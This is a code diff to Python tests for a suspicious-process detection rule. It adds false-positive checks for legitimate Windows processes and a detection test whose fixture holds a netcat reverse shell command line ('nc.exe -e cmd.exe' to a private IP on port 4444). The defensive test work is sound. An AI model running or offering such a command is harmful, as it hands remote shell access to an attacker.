@@ -115,21 +115,38 @@ async def test_suspicious_process_rule_temp_directory():
     assert "miner" in reason2
 
 
-async def test_suspicious_process_rule_outbound_network():
+async def test_suspicious_process_rule_outbound_network_no_fp():
     rule = SuspiciousProcessRule()
     context = {}
-    # Process with PID correlating to an outbound connection
+    # Legitimate processes like Code.exe and explorer.exe with outbound network connections must NOT trigger FP
     telemetry = {
         "process_list": [
-            {"pid": 9999, "name": "custom_agent", "exe": "/usr/bin/custom_agent"}
+            {"pid": 1111, "name": "Code.exe", "cmdline": "Code.exe --ms-enable-electron-run-as-node", "exe": "C:\\Program Files\\VS Code\\Code.exe"},
+            {"pid": 2222, "name": "explorer.exe", "cmdline": "C:\\Windows\\Explorer.EXE", "exe": "C:\\Windows\\explorer.exe"},
+            {"pid": 3333, "name": "sync.exe", "cmdline": "C:\\Windows\\System32\\sync.exe", "exe": "C:\\Windows\\System32\\sync.exe"},
         ],
         "network_connections": [
-            {"pid": 9999, "dst_ip": "203.0.113.5", "dst_port": 8080, "status": "ESTABLISHED"}
+            {"pid": 1111, "dst_ip": "20.189.173.1", "dst_port": 443, "status": "ESTABLISHED"},
+            {"pid": 2222, "dst_ip": "192.168.30.1", "dst_port": 445, "status": "ESTABLISHED"}
         ]
     }
     score, reason = await rule.evaluate(telemetry, context)
-    assert score == 25.0
-    assert "custom_agent" in reason
+    assert score == 0.0
+    assert reason == ""
+
+
+async def test_suspicious_process_rule_nc_reverse_shell():
+    rule = SuspiciousProcessRule()
+    context = {}
+    # nc.exe -e cmd reverse shell should trigger high severity score >= 50
+    telemetry = {
+        "process_list": [
+            {"name": "nc.exe", "cmdline": "nc.exe -e cmd.exe 192.168.30.104 4444", "exe": "C:\\Users\\Public\\nc.exe"}
+        ]
+    }
+    score, reason = await rule.evaluate(telemetry, context)
+    assert score >= 50.0
+    assert "nc.exe" in reason
 
 
 async def test_suspicious_process_rule_blacklist_nc_word_boundary():
@@ -142,7 +159,7 @@ async def test_suspicious_process_rule_blacklist_nc_word_boundary():
         ]
     }
     score, reason = await rule.evaluate(telemetry, context)
-    assert score == 25.0
+    assert score >= 25.0
     assert "nc" in reason
 
     # 'sync' or 'async' should NOT trigger 'nc'
